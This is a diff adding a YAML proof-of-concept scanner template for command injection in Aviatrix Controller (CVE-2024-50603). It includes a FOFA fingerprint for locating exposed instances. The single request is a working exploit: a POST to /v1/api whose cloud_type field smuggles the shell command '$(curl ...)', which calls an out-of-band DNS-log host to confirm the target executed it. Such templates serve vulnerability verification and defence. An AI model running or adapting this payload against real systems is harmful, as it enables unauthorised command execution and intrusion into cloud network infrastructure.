@@ -1,0 +1,22 @@
+id: poc-yaml-aviatrix-controller-command-injection
+info:
+  name: Aviatrix Controller 命令注入漏洞(CVE-2024-50603)
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 命令注入
+  - CVE-2024-50603
+  finger: aviatrix-controller
+  fofa: app="Aviatrix-Controller"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /v1/api
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+{{.domain}})
+  expression: reverse.Verify()
+transport: http
